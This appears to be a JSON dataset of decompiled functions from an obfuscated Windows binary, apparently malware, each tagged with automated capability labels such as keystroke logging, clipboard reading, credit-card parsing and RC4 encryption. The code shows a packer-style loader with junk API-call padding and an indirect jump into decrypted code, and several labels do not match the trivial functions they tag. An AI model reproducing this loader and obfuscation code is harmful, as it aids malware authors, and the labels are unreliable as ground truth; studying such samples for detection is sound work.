{
    "0044dc10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.0044dc10(void)\n\n{\n    uint var_aah;\n    uint var_4h;\n    \n    *0x45239c = _sym.imp.KERNEL32.dll_VirtualAlloc;\n    return *(*0x452384 + -4);\n}\n",
        "token_count": 57
    },
    "0044dd00": {
        "rules": [
            "parse credit card information/29d58176023943f783771ab0ee81acbc"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0044ddf6)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0044dd00(void)\n\n{\n    int32_t iVar1;\n    uint var_468h;\n    uint var_464h;\n    uint var_460h;\n    uint var_45ch;\n    uint var_3beh;\n    uint var_36ch;\n    uint var_368h;\n    uint var_364h;\n    int16_t var_360h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_25h;\n    int32_t var_ch;\n    code *var_4h;\n    \n    var_4h = _sym.imp.ADVAPI32.dll_RegQueryValueExW;\n    var_25h._0_1_ = 0x2b;\n    iVar1 = (*_sym.imp.USER32.dll_LoadCursorW)(0, 0x1402);\n    if (iVar1 == 0) {\n        var_10ch = 300;\n        var_104h = 1;\n        var_108h = 0x452390;\n        *0x452378 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0);\n        *0x4523b0 = *(*0x452378 + 0x3c);\n        while( true ) {\n            while( true ) {\n                var_110h = *0x4523bc;\n                iVar1 = (*var_4h)(*0x4523bc, 0x452394, 0, &var_104h, &var_368h, &var_10ch);\n                if (iVar1 == 0) break;\n                fcn.0044dd00();\n            }\n            if (var_364h == 0x6b) {\n                return 0;\n            }\n            if (var_368h._2_2_ == 0x69) break;\n            fcn.0044dd00();\n        }\n        if (var_364h._2_2_ == 0x71) {\n            var_ch = 0x482489;\n        }\n        if (var_364h._2_2_ == 0x70) {\n            var_ch = 0x4010fd;\n        }\n        if (var_364h == 0x53) {\n            var_ch = var_ch + 0x113c;\n        }\n        if (var_360h == 0x48) {\n            var_ch = var_ch + 4;\n        }\n        var_ch = var_ch + -1;\n        *0x452124 = *0x452124 - 0x14d;\n        if ((*0x452378 < *0x452124) && (*0x452124 < *0x452378 + *(*0x452378 + *0x4523b0 + 0x50))) {\n            *0x452350 = 0;\n        }\n        else {\n            *0x452378 = *0x45237c;\n            *0x452350 = 1;\n        }\n    }\n    else {\n        var_ch = 0;\n    }\n    return var_ch;\n}\n",
        "token_count": 704
    },
    "null": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl entry0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint arg_ch;\n    uint arg_10h;\n    uint var_64h;\n    uint var_5dh;\n    uint var_58h;\n    uint32_t var_2ch;\n    uint var_4h;\n    \n    (*_sym.imp.USER32.dll_CharNextA)(\"wLwniQzPcV\");\n    for (var_2ch = 5; var_2ch < 0xac4f; var_2ch = var_2ch + 0xc) {\n        (*_sym.imp.USER32.dll_GetKBCodePage)();\n    }\n    (*_sym.imp.USER32.dll_IsWindowUnicode)(*0x452374);\n    (*_sym.imp.GDI32.dll_FillPath)(*0x452374);\n    (*_sym.imp.USER32.dll_CharUpperW)(L\"YcaabCVVTJ\");\n    (*_sym.imp.GDI32.dll_SetMetaRgn)(*0x452374);\n    (*_sym.imp.USER32.dll_CloseWindow)(*0x452374);\n    (*_sym.imp.GDI32.dll_DeleteDC)(*0x452374);\n    (*_sym.imp.USER32.dll_GetSystemMetrics)(*0x452374);\n    (*_sym.imp.USER32.dll_IsIconic)(*0x452374);\n    (*_sym.imp.USER32.dll_GetWindowTextLengthW)(*0x452374);\n    (*_sym.imp.GDI32.dll_GetTextAlign)(*0x452374);\n    (*_sym.imp.USER32.dll_DestroyCursor)(*0x452374);\n    (*_sym.imp.USER32.dll_GetWindowContextHelpId)(*0x452374);\n    (*_sym.imp.USER32.dll_GetSysColorBrush)(*0x452374);\n    (*_sym.imp.USER32.dll_IsGUIThread)(*0x452374);\n    (*_sym.imp.GDI32.dll_CloseMetaFile)(*0x452374);\n    (*_sym.imp.GDI32.dll_CreatePatternBrush)(*0x452374);\n    (*_sym.imp.USER32.dll_EnumClipboardFormats)(*0x452374);\n    (*_sym.imp.USER32.dll_ReleaseCapture)();\n    (*_sym.imp.GDI32.dll_SwapBuffers)(*0x452374);\n    (*_sym.imp.USER32.dll_IsWindowVisible)(*0x452374);\n    (*_sym.imp.USER32.dll_EnumClipboardFormats)(*0x452374);\n    (*_sym.imp.USER32.dll_CharNextW)(L\"tGMv VrUis\");\n    (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n    (*_sym.imp.USER32.dll_IsGUIThread)(*0x452374);\n    (*_sym.imp.GDI32.dll_SaveDC)(*0x452374);\n    (*_sym.imp.USER32.dll_GetSysColor)(*0x452374);\n    (*_sym.imp.USER32.dll_CreateMenu)();\n    (*_sym.imp.GDI32.dll_GetMapMode)(*0x452374);\n    (*_sym.imp.GDI32.dll_GetColorSpace)(*0x452374);\n    *0x45237c = arg_8h;\n    *0x45235c = &stack0xfffffffc;\n    fcn.0044dbd0(0x100f, 0x202);\n    str.jmkl7kicu4p3050F55D_98B5_11CF1BB82_00AA00BDCE0Bf[0] = L'i';\n    str.jmkl7kicu4p3050F55D_98B5_11CF1BB82_00AA00BDCE0Bf[1] = L'n';\n    str.jmkl7kicu4p3050F55D_98B5_11CF1BB82_00AA00BDCE0Bf[2] = L't';\n    str.jmkl7kicu4p3050F55D_98B5_11CF1BB82_00AA00BDCE0Bf[29] = L'-';\n    str.jmkl7kicu4p3050F55D_98B5_11CF1BB82_00AA00BDCE0Bf[3] = L'e';\n    str.jmkl7kicu4p3050F55D_98B5_11CF1BB82_00AA00BDCE0Bf[4] = L'r';\n    str.jmkl7kicu4p3050F55D_98B5_11CF1BB82_00AA00BDCE0Bf[5] = L'f';\n    str.jmkl7kicu4p3050F55D_98B5_11CF1BB82_00AA00BDCE0Bf[6] = L'a';\n    str.jmkl7kicu4p3050F55D_98B5_11CF1BB82_00AA00BDCE0Bf[8] = L'e';\n    str.jmkl7kicu4p3050F55D_98B5_11CF1BB82_00AA00BDCE0Bf[9] = L'\\\\';\n    str.jmkl7kicu4p3050F55D_98B5_11CF1BB82_00AA00BDCE0Bf[10] = L'{';\n    str.jmkl7kicu4p3050F55D_98B5_11CF1BB82_00AA00BDCE0Bf[47] = L'}';\n    *0x4523a0 = _sym.imp.ADVAPI32.dll_RegOpenKeyExW;\n    do {\n        *0x452110 = *0x452110 + -2;\n        iVar1 = (**0x4523a0)(*0x452110, L\"jmkl7kicu4p3050F55D-98B5-11CF1BB82-00AA00BDCE0Bf\", 0, 0x20019, 0x4523bc);\n    } while (iVar1 != 0);\n    *0x452384 = fcn.0044dd00();\n    *0x452344 = fcn.0044dc10(0x214);\n    *0x452388 = fcn.0044dc60(0x1937);\n    arg_10h = 0x10a;\n    arg_ch = 0x452000;\n    arg_8h_00 = fcn.0044d640(300);\n    fcn.0044d520(arg_8h_00, arg_ch, arg_10h);\n    *0x452348 = *0x452344;\n    *0x452368 = 0;\n    *0x45236c = 0;\n    *0x452364 = 0x2a;\n    do {\n        iVar1 = fcn.0044dbd0(*0x45211c, *0x452348);\n        if (*0x452344 <= *0x452368) break;\n        fcn.0044ead0(0x27b, 0x16, iVar1);\n        *0x45236c = *0x45236c + *0x452364 + *0x45211c;\n        *0x452368 = *0x452368 + *0x45211c;\n        *0x452348 = *0x452348 - iVar1;\n        *0x45234c = iVar1;\n    } while (*0x452388 != 0);\n    *0x452354 = *0x452388 + 0x32710;\n    fcn.0044d620();\n    return;\n}\n",
        "token_count": 1676
    },
    "0044d4e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.0044d4e0(void)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *0x45235c;\n    **0x45235c = *0x452378;\n    puVar1[-1] = *0x452350;\n    // WARNING: Could not recover jumptable at 0x0044d514. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x452354)();\n    return;\n}\n",
        "token_count": 135
    },
    "0044d520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d520(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    uint var_684h;\n    uint var_4a6h;\n    uint var_461h;\n    uint var_3fch;\n    uint var_368h;\n    uint var_364h;\n    uint var_329h;\n    uint var_311h;\n    uint var_245h;\n    uint var_10fh;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    for (var_8h = 0; var_8h < arg_10h; var_8h = var_8h + 1) {\n        cVar1 = *(arg_ch + var_8h);\n        *(arg_8h + var_8h) = 0;\n        *(arg_8h + var_8h) = *(arg_8h + var_8h) + cVar1;\n    }\n    return;\n}\n",
        "token_count": 256
    },
    "0044d620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044d620(void)\n\n{\n    fcn.0044df40(1, 1);\n    return;\n}\n",
        "token_count": 30
    },
    "0044df40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044df40(void)\n\n{\n    uint var_88h;\n    uint var_84h;\n    uint var_77h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    for (*0x452358 = 0; *0x452358 < *0x452344; *0x452358 = *0x452358 + 4) {\n        *0x4523ac = *0x452388 + *0x452358;\n        **0x4523ac = **0x4523ac + *0x452358;\n        *0x452398 = *0x452358 + 0x4fd671;\n        fcn.0044d470();\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "0044e010": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044e010(uint32_t param_1)\n\n{\n    char *pcVar1;\n    uint32_t *puVar2;\n    uint8_t *puVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t extraout_ECX;\n    int32_t unaff_EBX;\n    int32_t iVar8;\n    int32_t unaff_EBP;\n    uchar *puVar9;\n    int32_t iVar10;\n    int32_t unaff_EDI;\n    int32_t iVar11;\n    uint8_t uVar12;\n    ulong uVar13;\n    \n    puVar9 = &stack0xfffffffc;\n    iVar10 = unaff_EBP + 8;\n    uVar5 = *(unaff_EBP + 4);\n    iVar11 = unaff_EDI + *(unaff_EBP + 0x6a);\n    uVar6 = param_1 & 0xffffff00 | param_1 ^ *(param_1 - 0x1e);\n    *(unaff_EBP + 0x25) = *(unaff_EBP + 0x25) + '\\x01';\n    pcVar1 = uVar6 - 0x76;\n    *pcVar1 = *pcVar1 + -0x4f;\n    iVar7 = uVar6 + 1;\n    uVar5 = uVar5 & 0xffffff00 | uVar5 + 0x38;\n    iVar8 = unaff_EBX + 1;\n    do {\n        uVar12 = 1;\n        pcVar4 = swi(0xc6);\n        uVar13 = (*pcVar4)(iVar10, puVar9, &stack0xfffffffc, iVar8, unaff_EDI, iVar7, iVar11);\n        unaff_EDI = uVar13 >> 0x20;\n        puVar9 = 0xf57a5a16;\n        uVar6 = uVar13 + 0x3aac33ca + uVar12;\n        iVar11 = uVar5 + 1;\n        iVar10 = iVar10 + 1;\n        puVar3 = uVar6 + 0x467cb0e8 + iVar11 * 4;\n        *puVar3 = *puVar3 | iVar8 + 1;\n        uVar5 = uVar6;\n        iVar7 = extraout_ECX;\n        iVar8 = iVar8 + 1;\n    } while (-1 < *puVar3);\n    puVar2 = unaff_EDI + extraout_ECX * 2;\n    *puVar2 = *puVar2 >> 0x18;\n    out(0xd4, uVar6);\n    return;\n}\n",
        "token_count": 606
    },
    "0044ead0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044ead0(uint noname_0, uint noname_1, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_c9h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_49h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = *0x452388 + *0x452368;\n    iVar2 = *0x452384 + *0x45236c;\n    for (var_8h = 0; var_8h < arg_10h; var_8h = var_8h + 1) {\n        *(iVar1 + var_8h) = *(iVar2 + var_8h);\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "0044eba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044eba0(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint var_38h;\n    uint var_4h;\n    \n    *arg_8h = *arg_8h + arg_ch;\n    return;\n}\n",
        "token_count": 62
    },
    "0044d690": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "log keystrokes via polling",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid fcn.0044d690(void)\n\n{\n    (*_sym.imp.USER32.dll_IsWindowEnabled)(*0x452374);\n    (*_sym.imp.USER32.dll_ReleaseCapture)();\n    (*_sym.imp.USER32.dll_GetKeyState)(*0x452374);\n    (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    (*_sym.imp.USER32.dll_CharNextW)(0x452128);\n    (*_sym.imp.GDI32.dll_UnrealizeObject)(*0x452374);\n    (*_sym.imp.USER32.dll_GetClipboardOwner)();\n    (*_sym.imp.GDI32.dll_GetEnhMetaFileW)(L\"FjTnXnNbjw\");\n    (*_sym.imp.USER32.dll_GetSysColor)(*0x452374);\n    (*_sym.imp.USER32.dll_PaintDesktop)(*0x452374);\n    (*_sym.imp.GDI32.dll_DeleteColorSpace)(*0x452374);\n    (*_sym.imp.GDI32.dll_SaveDC)(*0x452374);\n    (*_sym.imp.USER32.dll_GetCursor)();\n    (*_sym.imp.USER32.dll_CharNextW)(L\"fghvEbwyXC\");\n    (*_sym.imp.USER32.dll_DestroyIcon)(*0x452374);\n    (*_sym.imp.USER32.dll_IsGUIThread)(*0x452374);\n    (*_sym.imp.USER32.dll_GetThreadDesktop)(*0x452374);\n    (*_sym.imp.USER32.dll_GetKeyboardType)(*0x452374);\n    (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n    (*_sym.imp.USER32.dll_LoadCursorFromFileW)(L\"bzP dmINGx\");\n    (*_sym.imp.GDI32.dll_GetDCBrushColor)(*0x452374);\n    (*_sym.imp.USER32.dll_DrawMenuBar)(*0x452374);\n    (*_sym.imp.USER32.dll_GetClipboardData)(*0x452374);\n    (*_sym.imp.GDI32.dll_CloseEnhMetaFile)(*0x452374);\n    (*_sym.imp.GDI32.dll_GetColorSpace)(*0x452374);\n    (*_sym.imp.USER32.dll_GetWindowDC)(*0x452374);\n    (*_sym.imp.USER32.dll_IsCharAlphaW)(*0x452374 & 0xffff);\n    (*_sym.imp.GDI32.dll_DeleteObject)(*0x452374);\n    (*_sym.imp.USER32.dll_VkKeyScanA)(*0x452374 & 0xff);\n    (*_sym.imp.USER32.dll_GetListBoxInfo)(*0x452374);\n    (*_sym.imp.GDI32.dll_CreateHalftonePalette)(*0x452374);\n    (*_sym.imp.USER32.dll_GetKBCodePage)();\n    (*_sym.imp.GDI32.dll_GetTextColor)(*0x452374);\n    (*_sym.imp.GDI32.dll_GetDCBrushColor)(*0x452374);\n    (*_sym.imp.USER32.dll_OemKeyScan)(*0x452374 & 0xffff);\n    (*_sym.imp.GDI32.dll_CreateMetaFileA)(\"oLUkBYgWdl\");\n    (*_sym.imp.USER32.dll_GetClipboardData)(*0x452374);\n    (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n    (*_sym.imp.USER32.dll_GetClipboardData)(*0x452374);\n    (*_sym.imp.USER32.dll_CharLowerW)(L\"vVvarKbZ N\");\n    (*_sym.imp.GDI32.dll_GetTextColor)(*0x452374);\n    (*_sym.imp.USER32.dll_GetKeyboardType)(*0x452374);\n    (*_sym.imp.GDI32.dll_GetBkColor)(*0x452374);\n    (*_sym.imp.USER32.dll_GetParent)(*0x452374);\n    (*_sym.imp.GDI32.dll_DeleteColorSpace)(*0x452374);\n    (*_sym.imp.GDI32.dll_GetFontLanguageInfo)(*0x452374);\n    (*_sym.imp.GDI32.dll_CloseFigure)(*0x452374);\n    (*_sym.imp.GDI32.dll_WidenPath)(*0x452374);\n    (*_sym.imp.USER32.dll_IsWindowEnabled)(*0x452374);\n    (*_sym.imp.USER32.dll_GetParent)(*0x452374);\n    (*_sym.imp.USER32.dll_DestroyIcon)(*0x452374);\n    (*_sym.imp.GDI32.dll_CreateHalftonePalette)(*0x452374);\n    (*_sym.imp.GDI32.dll_GetTextColor)(*0x452374);\n    (*_sym.imp.GDI32.dll_DeleteEnhMetaFile)(*0x452374);\n    (*_sym.imp.USER32.dll_VkKeyScanW)(*0x452374 & 0xffff);\n    (*_sym.imp.USER32.dll_GetMenu)(*0x452374);\n    (*_sym.imp.GDI32.dll_PathToRegion)(*0x452374);\n    (*_sym.imp.USER32.dll_CountClipboardFormats)();\n    (*_sym.imp.USER32.dll_IsClipboardFormatAvailable)(*0x452374);\n    (*_sym.imp.USER32.dll_CloseWindow)(*0x452374);\n    (*_sym.imp.GDI32.dll_CreateSolidBrush)(*0x452374);\n    (*_sym.imp.USER32.dll_CloseClipboard)();\n    (*_sym.imp.GDI32.dll_CreateMetaFileW)(L\"WiYUZtENEF\");\n    (*_sym.imp.USER32.dll_GetSysColor)(*0x452374);\n    (*_sym.imp.GDI32.dll_GetPixelFormat)(*0x452374);\n    (*_sym.imp.GDI32.dll_GetObjectType)(*0x452374);\n    (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    (*_sym.imp.GDI32.dll_AddFontResourceW)(L\"odQFsLvTKt\");\n    (*_sym.imp.USER32.dll_CharUpperA)(\"WiUUsklOO \");\n    (*_sym.imp.USER32.dll_ReleaseCapture)();\n    (*_sym.imp.USER32.dll_CharNextW)(L\"qXBeWWgmOz\");\n    (*_sym.imp.GDI32.dll_CloseEnhMetaFile)(*0x452374);\n    (*_sym.imp.GDI32.dll_DeleteEnhMetaFile)(*0x452374);\n    (*_sym.imp.USER32.dll_IsWindowVisible)(*0x452374);\n    (*_sym.imp.USER32.dll_VkKeyScanA)(*0x452374 & 0xff);\n    (*_sym.imp.USER32.dll_IsWindow)(*0x452374);\n    (*_sym.imp.GDI32.dll_AbortPath)(*0x452374);\n    (*_sym.imp.GDI32.dll_GetTextCharset)(*0x452374);\n    (*_sym.imp.GDI32.dll_GetDCBrushColor)(*0x452374);\n    (*_sym.imp.USER32.dll_CloseClipboard)();\n    (*_sym.imp.GDI32.dll_GetTextColor)(*0x452374);\n    (*_sym.imp.GDI32.dll_EndPath)(*0x452374);\n    (*_sym.imp.USER32.dll_EnumClipboardFormats)(*0x452374);\n    (*_sym.imp.USER32.dll_CharNextW)(L\"tX cZOLxFp\");\n    (*_sym.imp.USER32.dll_GetActiveWindow)();\n    (*_sym.imp.USER32.dll_GetMenu)(*0x452374);\n    (*_sym.imp.GDI32.dll_CreateMetaFileA)(\"aDByLCTrqo\");\n    (*_sym.imp.GDI32.dll_GetSystemPaletteUse)(*0x452374);\n    (*_sym.imp.USER32.dll_CharLowerW)(L\"mXWzFqLshK\");\n    (*_sym.imp.USER32.dll_EndMenu)();\n    (*_sym.imp.USER32.dll_IsCharAlphaA)(*0x452374 & 0xff);\n    (*_sym.imp.GDI32.dll_GetEnhMetaFileA)(\"uWTVGWmDkC\");\n    (*_sym.imp.USER32.dll_GetWindowTextLengthA)(*0x452374);\n    (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n    (*_sym.imp.GDI32.dll_CancelDC)(*0x452374);\n    (*_sym.imp.USER32.dll_PaintDesktop)(*0x452374);\n    (*_sym.imp.USER32.dll_CharLowerA)(\"YtTGlWCmzd\");\n    (*_sym.imp.GDI32.dll_GetTextColor)(*0x452374);\n    (*_sym.imp.USER32.dll_GetSystemMetrics)(*0x452374);\n    (*_sym.imp.USER32.dll_DrawMenuBar)(*0x452374);\n    (*_sym.imp.GDI32.dll_EndPath)(*0x452374);\n    (*_sym.imp.GDI32.dll_GetTextColor)(*0x452374);\n    (*_sym.imp.USER32.dll_GetMenuContextHelpId)(*0x452374);\n    (*_sym.imp.GDI32.dll_CloseEnhMetaFile)(*0x452374);\n    (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n    (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n    (*_sym.imp.GDI32.dll_GetTextAlign)(*0x452374);\n    (*_sym.imp.GDI32.dll_CreateMetaFileW)(L\"cHGQfwMHjq\");\n    (*_sym.imp.USER32.dll_CharNextW)(L\"vGlBrmYQyF\");\n    (*_sym.imp.USER32.dll_GetActiveWindow)();\n    (*_sym.imp.GDI32.dll_CreateHalftonePalette)(*0x452374);\n    (*_sym.imp.USER32.dll_IsClipboardFormatAvailable)(*0x452374);\n    (*_sym.imp.GDI32.dll_CreatePatternBrush)(*0x452374);\n    (*_sym.imp.USER32.dll_GetClipboardViewer)();\n    (*_sym.imp.USER32.dll_ShowCaret)(*0x452374);\n    (*_sym.imp.USER32.dll_LoadCursorFromFileA)(\"DhRoUMeVsi\");\n    (*_sym.imp.USER32.dll_IsCharAlphaA)(*0x452374 & 0xff);\n    return;\n}\n",
        "token_count": 2075
    },
    "0044dbd0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0044dbd0(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint var_19h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h < arg_ch) {\n        arg_ch = arg_8h;\n    }\n    return arg_ch;\n}\n",
        "token_count": 85
    }
}